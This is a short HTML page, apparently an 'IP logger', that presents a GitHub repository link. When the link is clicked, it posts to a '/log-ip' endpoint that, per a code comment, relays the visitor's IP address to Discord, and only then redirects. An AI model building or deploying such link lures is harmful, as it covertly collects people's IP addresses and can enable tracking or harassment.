<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GitHub Link IP Logger</title>
</head>
<body>
  <h1>Click on the GitHub Link Below</h1>
  <a href="https://github.com/your-username/your-repo" id="github-link">GitHub Repository</a>

  <script>
    document.getElementById('github-link').addEventListener('click', function(e) {
      // Prevent the default behavior of the link (so the page doesn't reload)
      e.preventDefault();

      // Send a request to your server to log the IP and send it to Discord
      fetch('/log-ip', {
        method: 'POST',
      })
      .then(response => response.text())
      .then(data => {
        alert('IP Logged Successfully!'); // Show success message
        // After logging the IP, redirect the user to the GitHub link
        window.location.href = "https://github.com/your-username/your-repo"; // Redirect after logging IP
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Error logging IP');
      });
    });
  </script>
</body>
</html>
